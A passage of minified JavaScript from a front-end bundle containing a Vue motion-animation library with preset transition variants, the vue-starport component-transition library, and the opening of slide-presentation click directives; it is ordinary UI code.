i.onChange(a=>l[o]=a),e.value[o]=i,i};return Bh(t),{motionValues:e,get:s,stop:t}}const U4=e=>Array.isArray(e),xn=()=>({type:"spring",stiffness:500,damping:25,restDelta:.5,restSpeed:10}),Dr=e=>({type:"spring",stiffness:550,damping:e===0?2*Math.sqrt(550):30,restDelta:.01,restSpeed:10}),W4=e=>({type:"spring",stiffness:550,damping:e===0?100:30,restDelta:.01,restSpeed:10}),Br=()=>({type:"keyframes",ease:"linear",duration:300}),Y4=e=>({type:"keyframes",duration:800,values:e}),pc={default:W4,x:xn,y:xn,z:xn,rotate:xn,rotateX:xn,rotateY:xn,rotateZ:xn,scaleX:Dr,scaleY:Dr,scale:Dr,backgroundColor:Br,color:Br,opacity:Br},Jd=(e,t)=>{let s;return U4(t)?s=Y4:s=pc[e]||pc.default,{to:t,...s(t)}},fc={...lo,transform:Math.round},ep={color:ut,backgroundColor:ut,outlineColor:ut,fill:ut,stroke:ut,borderColor:ut,borderTopColor:ut,borderRightColor:ut,borderBottomColor:ut,borderLeftColor:ut,borderWidth:ae,borderTopWidth:ae,borderRightWidth:ae,borderBottomWidth:ae,borderLeftWidth:ae,borderRadius:ae,radius:ae,borderTopLeftRadius:ae,borderTopRightRadius:ae,borderBottomRightRadius:ae,borderBottomLeftRadius:ae,width:ae,maxWidth:ae,height:ae,maxHeight:ae,size:ae,top:ae,right:ae,bottom:ae,left:ae,padding:ae,paddingTop:ae,paddingRight:ae,paddingBottom:ae,paddingLeft:ae,margin:ae,marginTop:ae,marginRight:ae,marginBottom:ae,marginLeft:ae,rotate:bn,rotateX:bn,rotateY:bn,rotateZ:bn,scale:yo,scaleX:yo,scaleY:yo,scaleZ:yo,skew:bn,skewX:bn,skewY:bn,distance:ae,translateX:ae,translateY:ae,translateZ:ae,x:ae,y:ae,z:ae,perspective:ae,transformPerspective:ae,opacity:Rs,originX:lc,originY:lc,originZ:ae,zIndex:fc,filter:bl,WebkitFilter:bl,fillOpacity:Rs,strokeOpacity:Rs,numOctaves:fc},pi=e=>ep[e],tp=(e,t)=>t&&typeof e=="number"&&t.transform?t.transform(e):e;function K4(e,t){let s=pi(e);return s!==bl&&(s=io),s.getAnimatableNone?s.getAnimatableNone(t):void 0}const X4={linear:Hd,easeIn:ui,easeInOut:zd,easeOut:m4,circIn:Vd,circInOut:h4,circOut:Ud,backIn:di,backInOut:y4,backOut:g4,anticipate:v4,bounceIn:w4,bounceInOut:E4,bounceOut:qo},mc=e=>{if(Array.isArray(e)){const[t,s,o,r]=e;return N4(t,s,o,r)}else if(typeof e=="string")return X4[e];return e},Q4=e=>Array.isArray(e)&&typeof e[0]!="number",hc=(e,t)=>e==="zIndex"?!1:!!(typeof t=="number"||Array.isArray(t)||typeof t=="string"&&io.test(t)&&!t.startsWith("url("));function Z4(e){return Array.isArray(e.to)&&e.to[0]===null&&(e.to=[...e.to],e.to[0]=e.from),e}function G4({ease:e,times:t,delay:s,...o}){const r={...o};return t&&(r.offset=t),e&&(r.ease=Q4(e)?e.map(mc):mc(e)),s&&(r.elapsed=-s),r}function J4(e,t,s){return Array.isArray(t.to)&&(e.duration||(e.duration=800)),Z4(t),e9(e)||(e={...e,...Jd(s,t.to)}),{...t,...G4(e)}}function e9({delay:e,repeat:t,repeatType:s,repeatDelay:o,from:r,...l}){return!!Object.keys(l).length}function t9(e,t){return e[t]||e.default||e}function n9(e,t,s,o,r){const l=t9(o,e);let i=l.from===null||l.from===void 0?t.get():l.from;const a=hc(e,s);i==="none"&&a&&typeof s=="string"&&(i=K4(e,s));const c=hc(e,i);function u(p){const f={from:i,to:s,velocity:o.velocity?o.velocity:t.getVelocity(),onUpdate:m=>t.set(m)};return l.type==="inertia"||l.type==="decay"?O4({...f,...l}):Yd({...J4(l,f,e),onUpdate:m=>{f.onUpdate(m),l.onUpdate&&l.onUpdate(m)},onComplete:()=>{o.onComplete&&o.onComplete(),r&&r(),p&&p()}})}function d(p){return t.set(s),o.onComplete&&o.onComplete(),r&&r(),p&&p(),{stop:()=>{}}}return!c||!a||l.type===!1?d:u}function s9(){const{motionValues:e,stop:t,get:s}=V4();return{motionValues:e,stop:t,push:(r,l,i,a={},c)=>{const u=i[r],d=s(r,u,i);if(a&&a.immediate){d.set(l);return}const p=n9(r,d,l,a,c);d.start(p)}}}function o9(e,t={},{motionValues:s,push:o,stop:r}=s9()){const l=w(t),i=z(!1);me(s,p=>{i.value=Object.values(p).filter(f=>f.isAnimating()).length>0},{immediate:!0,deep:!0});const a=p=>{if(!l||!l[p])throw new Error(`The variant ${p} does not exist.`);return l[p]},c=p=>(typeof p=="string"&&(p=a(p)),Promise.all(Object.entries(p).map(([f,m])=>{if(f!=="transition")return new Promise(h=>{o(f,m,e,p.transition||Jd(f,p[f]),h)})}).filter(Boolean)));return{isAnimating:i,apply:c,set:p=>{const f=Zr(p)?p:a(p);Object.entries(f).forEach(([m,h])=>{m!=="transition"&&o(m,h,e,{immediate:!0})})},leave:async p=>{let f;if(l&&(l.leave&&(f=l.leave),!l.leave&&l.initial&&(f=l.initial)),!f){p();return}await c(f),p()},stop:r}}const fi=typeof window<"u",r9=()=>fi&&window.onpointerdown===null,l9=()=>fi&&window.ontouchstart===null,i9=()=>fi&&window.onmousedown===null;function a9({target:e,state:t,variants:s,apply:o}){const r=w(s),l=z(!1),i=z(!1),a=z(!1),c=D(()=>{let d=[];return r&&(r.hovered&&(d=[...d,...Object.keys(r.hovered)]),r.tapped&&(d=[...d,...Object.keys(r.tapped)]),r.focused&&(d=[...d,...Object.keys(r.focused)])),d}),u=D(()=>{const d={};Object.assign(d,t.value),l.value&&r.hovered&&Object.assign(d,r.hovered),i.value&&r.tapped&&Object.assign(d,r.tapped),a.value&&r.focused&&Object.assign(d,r.focused);for(const p in d)c.value.includes(p)||delete d[p];return d});r.hovered&&(ue(e,"mouseenter",()=>l.value=!0),ue(e,"mouseleave",()=>{l.value=!1,i.value=!1}),ue(e,"mouseout",()=>{l.value=!1,i.value=!1})),r.tapped&&(i9()&&(ue(e,"mousedown",()=>i.value=!0),ue(e,"mouseup",()=>i.value=!1)),r9()&&(ue(e,"pointerdown",()=>i.value=!0),ue(e,"pointerup",()=>i.value=!1)),l9()&&(ue(e,"touchstart",()=>i.value=!0),ue(e,"touchend",()=>i.value=!1))),r.focused&&(ue(e,"focus",()=>a.value=!0),ue(e,"blur",()=>a.value=!1)),me(u,o)}function c9({set:e,target:t,apply:s,variants:o,variant:r}){const l=w(o);me(()=>t,()=>{!l||(l.initial&&e("initial"),l.enter&&(r.value="enter"))},{immediate:!0,flush:"pre"})}function u9({state:e,apply:t}){me(e,s=>{s&&t(s)},{immediate:!0})}function d9({target:e,variants:t,variant:s}){const o=w(t);o&&(o.visible||o.visibleOnce)&&k0(e,([{isIntersecting:r}])=>{o.visible?r?s.value="visible":s.value="initial":o.visibleOnce&&(r&&s.value!=="visibleOnce"?s.value="visibleOnce":s.value||(s.value="initial"))})}function p9(e,t={syncVariants:!0,lifeCycleHooks:!0,visibilityHooks:!0,eventListeners:!0}){t.lifeCycleHooks&&c9(e),t.syncVariants&&u9(e),t.visibilityHooks&&d9(e),t.eventListeners&&a9(e)}function np(e={}){const t=Me({...e}),s=z({});return me(t,()=>{const o={};for(const[r,l]of Object.entries(t)){const i=pi(r),a=tp(l,i);o[r]=a}s.value=o},{immediate:!0,deep:!0}),{state:t,style:s}}function mi(e,t){me(()=>Bt(e),s=>{!s||t(s)},{immediate:!0})}const f9={x:"translateX",y:"translateY",z:"translateZ"};function sp(e={},t=!0){const s=Me({...e}),o=z("");return me(s,r=>{let l="",i=!1;t&&(r.x||r.y||r.z)&&(l+=`translate3d(${[r.x||0,r.y||0,r.z||0].map(ae.transform).join(",")}) `,i=!0);for(const[a,c]of Object.entries(r)){if(t&&(a==="x"||a==="y"||a==="z"))continue;const u=pi(a),d=tp(c,u);l+=`${f9[a]||a}(${d}) `}t&&!i&&(l+="translateZ(0px) "),o.value=l.trim()},{immediate:!0,deep:!0}),{state:s,transform:o}}const m9=["","X","Y","Z"],h9=["perspective","translate","scale","rotate","skew"],op=["transformPerspective","x","y","z"];h9.forEach(e=>{m9.forEach(t=>{const s=e+t;op.push(s)})});const g9=new Set(op);function hi(e){return g9.has(e)}const y9=new Set(["originX","originY","originZ"]);function rp(e){return y9.has(e)}function v9(e){const t={},s={};return Object.entries(e).forEach(([o,r])=>{hi(o)||rp(o)?t[o]=r:s[o]=r}),{transform:t,style:s}}function lp(e){const{transform:t,style:s}=v9(e),{transform:o}=sp(t),{style:r}=np(s);return o.value&&(r.value.transform=o.value),r.value}function _9(e,t){let s,o;const{state:r,style:l}=np();return mi(e,i=>{o=i;for(const a of Object.keys(ep))i.style[a]===null||i.style[a]===""||hi(a)||rp(a)||(r[a]=i.style[a]);s&&Object.entries(s).forEach(([a,c])=>i.style[a]=c),t&&t(r)}),me(l,i=>{if(!o){s=i;return}for(const a in i)o.style[a]=i[a]},{immediate:!0}),{style:r}}function b9(e){const t=e.trim().split(/\) |\)/);if(t.length===1)return{};const s=o=>o.endsWith("px")||o.endsWith("deg")?parseFloat(o):isNaN(Number(o))?Number(o):o;return t.reduce((o,r)=>{if(!r)return o;const[l,i]=r.split("("),c=i.split(",").map(d=>s(d.endsWith(")")?d.replace(")",""):d.trim())),u=c.length===1?c[0]:c;return{...o,[l]:u}},{})}function x9(e,t){Object.entries(b9(t)).forEach(([s,o])=>{const r=["x","y","z"];if(s==="translate3d"){if(o===0){r.forEach(l=>e[l]=0);return}o.forEach((l,i)=>e[r[i]]=l);return}if(o=parseFloat(o),s==="translateX"){e.x=o;return}if(s==="translateY"){e.y=o;return}if(s==="translateZ"){e.z=o;return}e[s]=o})}function w9(e,t){let s,o;const{state:r,transform:l}=sp();return mi(e,i=>{o=i,i.style.transform&&x9(r,i.style.transform),s&&(i.style.transform=s),t&&t(r)}),me(l,i=>{if(!o){s=i;return}o.style.transform=i},{immediate:!0}),{transform:r}}function E9(e,t){const s=Me({}),o=i=>Object.entries(i).forEach(([a,c])=>s[a]=c),{style:r}=_9(e,o),{transform:l}=w9(e,o);return me(s,i=>{Object.entries(i).forEach(([a,c])=>{const u=hi(a)?l:r;u[a]&&u[a]===c||(u[a]=c)})},{immediate:!0,deep:!0}),mi(e,()=>t&&o(t)),{motionProperties:s,style:r,transform:l}}function A9(e={}){const t=w(e),s=z();return{state:D(()=>{if(!!s.value)return t[s.value]}),variant:s}}function ip(e,t={},s){const{motionProperties:o}=E9(e),{variant:r,state:l}=A9(t),i=o9(o,t),a={target:e,variant:r,variants:t,state:l,motionProperties:o,...i};return p9(a,s),a}const S9=["initial","enter","leave","visible","visible-once","hovered","tapped","focused","delay"],k9=(e,t)=>{const s=e.props?e.props:e.data&&e.data.attrs?e.data.attrs:{};s&&(s.variants&&Zr(s.variants)&&(t.value={...t.value,...s.variants}),S9.forEach(o=>{if(o==="delay"){if(s&&s[o]&&fh(s[o])){const r=s[o];t&&t.value&&(t.value.enter&&(t.value.enter.transition||(t.value.enter.transition={}),t.value.enter.transition={delay:r,...t.value.enter.transition}),t.value.visible&&(t.value.visible.transition||(t.value.visible.transition={}),t.value.visible.transition={delay:r,...t.value.visible.transition}),t.value.visibleOnce&&(t.value.visibleOnce.transition||(t.value.visibleOnce.transition={}),t.value.visibleOnce.transition={delay:r,...t.value.visibleOnce.transition}))}return}o==="visible-once"&&(o="visibleOnce"),s&&s[o]&&Zr(s[o])&&(t.value[o]=s[o])}))},Fr=e=>({created:(o,r,l)=>{const i=r.value&&typeof r.value=="string"?r.value:l.key;i&&$r[i]&&$r[i].stop();const a=z(e||{});typeof r.value=="object"&&(a.value=r.value),k9(l,a);const c=ip(o,a);o.motionInstance=c,i&&($r[i]=c)},unmounted:o=>{o.motionInstance&&o.motionInstance.stop()},getSSRProps(o,r){let{initial:l}=o.value||r&&(r==null?void 0:r.props)||{};l=w(l);const i=Cw((e==null?void 0:e.initial)||{},l||{});return!i||Object.keys(i).length===0?void 0:{style:lp(i)}}}),C9={initial:{opacity:0},enter:{opacity:1}},$9={initial:{opacity:0},visible:{opacity:1}},D9={initial:{opacity:0},visibleOnce:{opacity:1}},B9={initial:{scale:0,opacity:0},enter:{scale:1,opacity:1}},F9={initial:{scale:0,opacity:0},visible:{scale:1,opacity:1}},O9={initial:{scale:0,opacity:0},visibleOnce:{scale:1,opacity:1}},I9={initial:{x:-100,rotate:90,opacity:0},enter:{x:0,rotate:0,opacity:1}},T9={initial:{x:-100,rotate:90,opacity:0},visible:{x:0,rotate:0,opacity:1}},P9={initial:{x:-100,rotate:90,opacity:0},visibleOnce:{x:0,rotate:0,opacity:1}},M9={initial:{x:100,rotate:-90,opacity:0},enter:{x:0,rotate:0,opacity:1}},L9={initial:{x:100,rotate:-90,opacity:0},visible:{x:0,rotate:0,opacity:1}},R9={initial:{x:100,rotate:-90,opacity:0},visibleOnce:{x:0,rotate:0,opacity:1}},N9={initial:{y:-100,rotate:-90,opacity:0},enter:{y:0,rotate:0,opacity:1}},q9={initial:{y:-100,rotate:-90,opacity:0},visible:{y:0,rotate:0,opacity:1}},j9={initial:{y:-100,rotate:-90,opacity:0},visibleOnce:{y:0,rotate:0,opacity:1}},H9={initial:{y:100,rotate:90,opacity:0},enter:{y:0,rotate:0,opacity:1}},z9={initial:{y:100,rotate:90,opacity:0},visible:{y:0,rotate:0,opacity:1}},V9={initial:{y:100,rotate:90,opacity:0},visibleOnce:{y:0,rotate:0,opacity:1}},U9={initial:{x:-100,opacity:0},enter:{x:0,opacity:1}},W9={initial:{x:-100,opacity:0},visible:{x:0,opacity:1}},Y9={initial:{x:-100,opacity:0},visibleOnce:{x:0,opacity:1}},K9={initial:{x:100,opacity:0},enter:{x:0,opacity:1}},X9={initial:{x:100,opacity:0},visible:{x:0,opacity:1}},Q9={initial:{x:100,opacity:0},visibleOnce:{x:0,opacity:1}},Z9={initial:{y:-100,opacity:0},enter:{y:0,opacity:1}},G9={initial:{y:-100,opacity:0},visible:{y:0,opacity:1}},J9={initial:{y:-100,opacity:0},visibleOnce:{y:0,opacity:1}},eE={initial:{y:100,opacity:0},enter:{y:0,opacity:1}},tE={initial:{y:100,opacity:0},visible:{y:0,opacity:1}},nE={initial:{y:100,opacity:0},visibleOnce:{y:0,opacity:1}},xl={__proto__:null,fade:C9,fadeVisible:$9,fadeVisibleOnce:D9,pop:B9,popVisible:F9,popVisibleOnce:O9,rollBottom:H9,rollLeft:I9,rollRight:M9,rollTop:N9,rollVisibleBottom:z9,rollVisibleLeft:T9,rollVisibleRight:L9,rollVisibleTop:q9,rollVisibleOnceBottom:V9,rollVisibleOnceLeft:P9,rollVisibleOnceRight:R9,rollVisibleOnceTop:j9,slideBottom:eE,slideLeft:U9,slideRight:K9,slideTop:Z9,slideVisibleBottom:tE,slideVisibleLeft:W9,slideVisibleRight:X9,slideVisibleTop:G9,slideVisibleOnceBottom:nE,slideVisibleOnceLeft:Y9,slideVisibleOnceRight:Q9,slideVisibleOnceTop:J9},sE=Ae({props:{is:{type:[String,Object],required:!1},preset:{type:String,required:!1},instance:{type:Object,required:!1},variants:{type:Object,required:!1},initial:{type:Object,required:!1},enter:{type:Object,required:!1},leave:{type:Object,required:!1},visible:{type:Object,required:!1},visibleOnce:{type:Object,required:!1},hovered:{type:Object,required:!1},tapped:{type:Object,required:!1},focused:{type:Object,required:!1},delay:{type:[Number,String],required:!1}},setup(e){var a;const t=am(),s=Me({});if(!e.is&&!t.default)return()=>vt("div",{});const o=D(()=>{let c;return e.preset&&(c=xl[e.preset]),c}),r=D(()=>({initial:e.initial,enter:e.enter,leave:e.leave,visible:e.visible,visibleOnce:e.visibleOnce,hovered:e.hovered,tapped:e.tapped,focused:e.focused})),l=D(()=>{const c={...r.value,...o.value||{},...e.variants||{}};return e.delay&&(c.enter.transition={...c.enter.transition},c.enter.transition.delay=parseInt(e.delay)),c}),i=D(()=>{if(!e.is)return;let c=e.is;return typeof i.value=="string"&&!vp(c)&&(c=Bo(c)),c});if(((a=process==null?void 0:process.env)==null?void 0:a.NODE_ENV)==="development"||(process==null?void 0:process.dev)){const c=u=>{var d;(d=u.variants)!=null&&d.initial&&u.set("initial"),setTimeout(()=>{var p,f,m;(p=u.variants)!=null&&p.enter&&u.apply("enter"),(f=u.variants)!=null&&f.visible&&u.apply("visible"),(m=u.variants)!=null&&m.visibleOnce&&u.apply("visibleOnce")},10)};ql(()=>Object.entries(s).forEach(([u,d])=>c(d)))}return{slots:t,component:i,motionConfig:l,instances:s}},render({slots:e,motionConfig:t,instances:s,component:o}){var a;const r=lp(t.initial||{}),l=(c,u)=>(c.props||(c.props={}),c.props.style=r,c.props.onVnodeMounted=({el:d})=>{const p=ip(d,t);s[u]=p},c);if(o){const c=vt(o,void 0,e);return l(c,0),c}return(((a=e.default)==null?void 0:a.call(e))||[]).map((c,u)=>l(c,u))}});function oE(e){const t="\xE0\xE1\xE2\xE4\xE6\xE3\xE5\u0101\u0103\u0105\xE7\u0107\u010D\u0111\u010F\xE8\xE9\xEA\xEB\u0113\u0117\u0119\u011B\u011F\u01F5\u1E27\xEE\xEF\xED\u012B\u012F\xEC\u0142\u1E3F\xF1\u0144\u01F9\u0148\xF4\xF6\xF2\xF3\u0153\xF8\u014D\xF5\u0151\u1E55\u0155\u0159\xDF\u015B\u0161\u015F\u0219\u0165\u021B\xFB\xFC\xF9\xFA\u016B\u01D8\u016F\u0171\u0173\u1E83\u1E8D\xFF\xFD\u017E\u017A\u017C\xB7/_,:;",s="aaaaaaaaaacccddeeeeeeeegghiiiiiilmnnnnoooooooooprrsssssttuuuuuuuuuwxyyzzz------",o=new RegExp(t.split("").join("|"),"g");return e.toString().replace(/[A-Z]/g,r=>`-${r}`).toLowerCase().replace(/\s+/g,"-").replace(o,r=>s.charAt(t.indexOf(r))).replace(/&/g,"-and-").replace(/[^\w\-]+/g,"").replace(/\-\-+/g,"-").replace(/^-+/,"").replace(/-+$/,"")}const rE={install(e,t){if(e.directive("motion",Fr()),e.component("Motion",sE),!t||t&&!t.excludePresets)for(const s in xl){const o=xl[s];e.directive(`motion-${oE(s)}`,Fr(o))}if(t&&t.directives)for(const s in t.directives){const o=t.directives[s];o.initial,e.directive(`motion-${s}`,Fr(o))}}};var gc;const qs=typeof window<"u",lE=Object.prototype.toString,iE=e=>lE.call(e)==="[object Object]";qs&&((gc=window==null?void 0:window.navigator)==null?void 0:gc.userAgent)&&/iP(ad|hone|od)/.test(window.navigator.userAgent);function aE(e){return Lc()?(Rc(e),!0):!1}function cE(e){var t;const s=w(e);return(t=s==null?void 0:s.$el)!=null?t:s}const uE=qs?window:void 0,wl=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},El="__vueuse_ssr_handlers__";wl[El]=wl[El]||{};wl[El];function dE(e,t={}){const{immediate:s=!0,window:o=uE}=t,r=z(!1);let l=null;function i(){!r.value||!o||(e(),l=o.requestAnimationFrame(i))}function a(){!r.value&&o&&(r.value=!0,i())}function c(){r.value=!1,l!=null&&o&&(o.cancelAnimationFrame(l),l=null)}return s&&a(),aE(c),{isActive:r,pause:c,resume:a}}var yc;(function(e){e.UP="UP",e.RIGHT="RIGHT",e.DOWN="DOWN",e.LEFT="LEFT",e.NONE="NONE"})(yc||(yc={}));const gi="vue-starport-injection",ap="vue-starport-options",pE={duration:800,easing:"cubic-bezier(0.45, 0, 0.55, 1)",keepAlive:!1},cp={port:{type:String,required:!0},duration:{type:Number,required:!1},easing:{type:String,required:!1},keepAlive:{type:Boolean,required:!1,default:void 0},mountedProps:{type:Object,required:!1},initialProps:{type:Object,required:!1}};var fE=Object.defineProperty,Ho=Object.getOwnPropertySymbols,up=Object.prototype.hasOwnProperty,dp=Object.prototype.propertyIsEnumerable,vc=(e,t,s)=>t in e?fE(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,mE=(e,t)=>{for(var s in t||(t={}))up.call(t,s)&&vc(e,s,t[s]);if(Ho)for(var s of Ho(t))dp.call(t,s)&&vc(e,s,t[s]);return e},_c=(e,t)=>{var s={};for(var o in e)up.call(e,o)&&t.indexOf(o)<0&&(s[o]=e[o]);if(e!=null&&Ho)for(var o of Ho(e))t.indexOf(o)<0&&dp.call(e,o)&&(s[o]=e[o]);return s};const hE=Ae({name:"StarportProxy",props:mE({props:{type:Object,default:()=>({})},component:{type:Object,required:!0}},cp),setup(e,t){const s=N(gi),o=D(()=>s.getInstance(e.port,e.component)),r=z(),l=o.value.generateId(),i=z(!1);return o.value.isVisible||(o.value.land(),i.value=!0),ps(async()=>{o.value.el||(o.value.el=r.value,await et(),i.value=!0,o.value.rect.update())}),er(async()=>{o.value.rect.update(),o.value.liftOff(),o.value.el=void 0,i.value=!1,!o.value.options.keepAlive&&(await et(),await et(),!o.value.el&&s.dispose(o.value.port))}),me(()=>e,async()=>{o.value.props&&await et();const a=e,{props:c}=a,u=_c(a,["props"]);o.value.props=c||{},o.value.setLocalOptions(u)},{deep:!0,immediate:!0}),()=>{const a=e,{initialProps:c,mountedProps:u}=a,d=_c(a,["initialProps","mountedProps"]),p=Qe(d,(i.value?u:c)||{});return vt("div",Qe(p,{id:l,ref:r,"data-starport-proxy":o.value.componentId,"data-starport-landed":o.value.isLanded?"true":void 0,"data-starport-floating":o.value.isLanded?void 0:"true"}),t.slots.default?vt(t.slots.default):void 0)}}});var gE=Object.defineProperty,yE=Object.defineProperties,vE=Object.getOwnPropertyDescriptors,bc=Object.getOwnPropertySymbols,_E=Object.prototype.hasOwnProperty,bE=Object.prototype.propertyIsEnumerable,xc=(e,t,s)=>t in e?gE(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,xE=(e,t)=>{for(var s in t||(t={}))_E.call(t,s)&&xc(e,s,t[s]);if(bc)for(var s of bc(t))bE.call(t,s)&&xc(e,s,t[s]);return e},wE=(e,t)=>yE(e,vE(t));const EE=Ae({name:"Starport",inheritAttrs:!0,props:cp,setup(e,t){const s=z(!1);return ps(()=>{s.value=!0}),()=>{var i,a;const o=(a=(i=t.slots).default)==null?void 0:a.call(i);if(!o)throw new Error("[Vue Starport] Slot is required to use <Starport>");if(o.length!==1)throw new Error(`[Vue Starport] <Starport> requires exactly one slot, but got ${o.length}`);const r=o[0];let l=r.type;return(!iE(l)||rs(l))&&(l={render(){return o}}),vt(hE,wE(xE({},e),{key:e.port,component:Xo(l),props:r.props}))}}});function AE(e){const t=Me({height:0,width:0,left:0,top:0,update:o,listen:l,pause:i,margin:"0px",padding:"0px"}),s=qs?document.documentElement||document.body:void 0;function o(){if(!qs)return;const a=cE(e);if(!a)return;const{height:c,width:u,left:d,top:p}=a.getBoundingClientRect(),f=window.getComputedStyle(a),m=f.margin,h=f.padding;Object.assign(t,{height:c,width:u,left:d,top:s.scrollTop+p,margin:m,padding:h})}const r=dE(o,{immediate:!1});function l(){!qs||(o(),r.resume())}function i(){r.pause()}return t}let SE=(e,t=21)=>(s=t)=>{let o="",r=s;for(;r--;)o+=e[Math.random()*e.length|0];return o};const wc=SE("abcdefghijklmnopqrstuvwxyz",5);function Ec(e){return e.replace(/([a-z])([A-Z])/g,"$1-$2").toLowerCase().replace(/[^\w\d_-]/g,"")}function kE(e){var t;return e.name||((t=e.__file)==null?void 0:t.split(/[\/\\.]/).slice(-2)[0])||""}var CE=Object.defineProperty,Ac=Object.getOwnPropertySymbols,$E=Object.prototype.hasOwnProperty,DE=Object.prototype.propertyIsEnumerable,Sc=(e,t,s)=>t in e?CE(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,Or=(e,t)=>{for(var s in t||(t={}))$E.call(t,s)&&Sc(e,s,t[s]);if(Ac)for(var s of Ac(t))DE.call(t,s)&&Sc(e,s,t[s]);return e};function BE(e,t,s={}){const o=kE(t),r=Ec(o)||wc(),l=z(),i=z(null),a=z(!1),c=z(!1),u=kp(!0),d=z({}),p=D(()=>Or(Or(Or({},pE),s),d.value)),f=z(0);let m;u.run(()=>{m=AE(l),me(l,async k=>{k&&(c.value=!0),await et(),l.value||(c.value=!1)})});const h=Ec(e);function x(){return`starport-${r}-${h}-${wc()}`}const b=x();return Me({el:l,id:b,port:e,props:i,rect:m,scope:u,isLanded:a,isVisible:c,options:p,liftOffTime:f,component:t,componentName:o,componentId:r,generateId:x,setLocalOptions(k={}){d.value=JSON.parse(JSON.stringify(k))},elRef(){return l},liftOff(){!a.value||(a.value=!1,f.value=Date.now(),m.listen())},land(){a.value||(a.value=!0,m.pause())}})}function FE(e){const t=Me(new Map);function s(r,l){let i=t.get(r);return i||(i=BE(r,l,e),t.set(r,i)),i.component=l,i}function o(r){var l;(l=t.get(r))==null||l.scope.stop(),t.delete(r)}return{portMap:t,dispose:o,getInstance:s}}var OE=Object.defineProperty,IE=Object.defineProperties,TE=Object.getOwnPropertyDescriptors,kc=Object.getOwnPropertySymbols,PE=Object.prototype.hasOwnProperty,ME=Object.prototype.propertyIsEnumerable,Cc=(e,t,s)=>t in e?OE(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,LE=(e,t)=>{for(var s in t||(t={}))PE.call(t,s)&&Cc(e,s,t[s]);if(kc)for(var s of kc(t))ME.call(t,s)&&Cc(e,s,t[s]);return e},RE=(e,t)=>IE(e,TE(t));const NE=Ae({name:"StarportCraft",props:{port:{type:String,required:!0},component:{type:Object,required:!0}},setup(e){const t=N(gi);if(!t)throw new Error("[Vue Starport] Failed to find the carrier, all Starport components must be wrapped in a <StarportCarrier> component.");const s=D(()=>t.getInstance(e.port,e.component)),o=D(()=>{var i;return((i=s.value.el)==null?void 0:i.id)||s.value.id}),r=D(()=>{const i=Date.now()-s.value.liftOffTime,a=Math.max(0,s.value.options.duration-i),c=s.value.rect,u={position:"absolute",left:0,top:0,width:`${c.width}px`,height:`${c.height}px`,margin:c.margin,padding:c.padding,transform:`translate3d(${c.left}px,${c.top}px,0px)`};return!s.value.isVisible||!s.value.el?RE(LE({},u),{zIndex:-1,display:"none"}):(s.value.isLanded?u.display="none":Object.assign(u,{transitionProperty:"all",transitionDuration:`${a}ms`,transitionTimingFunction:s.value.options.easing}),u)}),l={};return()=>{const i=!!(s.value.isLanded&&s.value.el);return vt("div",{style:r.value,"data-starport-craft":s.value.componentId,"data-starport-landed":s.value.isLanded?"true":void 0,"data-starport-floating":s.value.isLanded?void 0:"true",onTransitionend:s.value.land},vt(Zf,{to:i?`#${o.value}`:"body",disabled:!i},vt(s.value.component,Qe(l,s.value.props))))}}}),qE=Ae({name:"StarportCarrier",setup(e,{slots:t}){const s=FE(N(ap,{}));return hn().appContext.app.provide(gi,s),()=>{var r;return[(r=t.default)==null?void 0:r.call(t),Array.from(s.portMap.entries()).map(([l,{component:i}])=>vt(NE,{key:l,port:l,component:i}))]}}});function jE(e={}){return{install(t){t.provide(ap,e),t.component("Starport",EE),t.component("StarportCarrier",qE)}}}function HE(e){function t(){document.documentElement.style.setProperty("--vh",`${window.innerHeight*.01}px`)}t(),window.addEventListener("resize",t),e.app.use(rE),e.app.use(jE({keepAlive:!0}))}function ft(e,t,s){var o,r;return(r=((o=e.instance)==null?void 0:o.$).provides[t])!=null?r:s}function zE(){return{install(e){e.directive("click",{name:"v-click",mounted(t,s){var d,p,f,m;if(Ms.value||((d=ft(s,Os))==null?void 0:d.value))return;const o=ft(s,kn),r=ft(s,Fs),l=ft(s,Xr),i=s.modifiers.hide!==!1&&s.modifiers.hide!=null,a=s.modifiers.fade!==!1&&s.modifiers.fade!=null,c=((p=o==null?void 0:o.value)==null?void 0:p.length)||0,u=a?Zm:mr;if(o&&!((f=o==null?void 0:o.value)!=null&&f.includes(t))&&o.value.push(t),s.value===null&&(s.value=o==null?void 0:o.value.length),!(l!=null&&l.value.has(s.value)))l==null||l.value.set(s.value,[t]);else if(!((m=l==null?void 0:l.value.get(s.value))!=null&&m.includes(t))){const h=(l==null?void 0:l.value.get(s.value))||[];l==null||l.value.set(s.value,[t].concat(h))}t==null||t.classList.toggle(En,!0),r&&me(r,()=>{var k;const h=(k=r==null?void 0:r.value)!=null?k:0,x=s.value!=null?h>=s.value:h>c;t.classList.contains(hr)||t.classList.toggle(u,!x),i!==!1&&i!==void 0&&t.classList.toggle(u,x),t.classList.toggle(xs,!1);const b=l==null?void 0:l.value.get(h);b==null||b.forEach((S,E)=>{S.classList.toggle(ho,!1),E===b.length-1?S.classList.toggle(xs,!0):S.classList.toggle(ho,!0)}),t.classList.contains(xs)||t.classList.toggle(ho,x)},{immediate:!0})},unmounted(t,s){t==null||t.classList.toggle(En,!1);const o=ft(s,kn);o!=null&&o.value&&Qr(o.value,t)}}),e.directive("after",{name:"v-after",mounted(t,s){var a,c;if(Ms.value||((a=ft(s,Os))==null?void 0:a.value))return;const o=ft(s,kn),r=ft(s,Fs),l=ft(s,Xr),i=o==null?void 0:o.value.length;s.value===void 0&&(s.value=o==null?void 0:o.value.length),l!=null&&l.value.has(s.value)?(c=l==null?void 0:l.value.get(s.value))==null||c.push(t):l==null||l.value.set(s.value,[t]),t==null||t.classList.toggle(En,!0),r&&me(r,()=>{var d,p,f;const u=((d=r.value)!=null?d:0)>=((f=(p=s.value)!=null?p:i)!=null?f:0);t.classList.contains(hr)||t.classList.toggle(mr,!u),t.classList.toggle(xs,!1),t.classList.contains(xs)||t.classList.toggle(ho,u)},{immediate:!0})},unmounted(t){t==null||t.classList.toggle(En,!0)}}),e.directive("click-hide",{name:"v-click-hide",mounted(t,s){var i,a,c;if(Ms.value||((i=ft(s,Os))==null?void 0:i.value))return;const o=ft(s,kn),r=ft(s,Fs),l=((a=o==null?void 0:o.value)==null?void 0:a.length)||0;o&&!((c=o==null?void 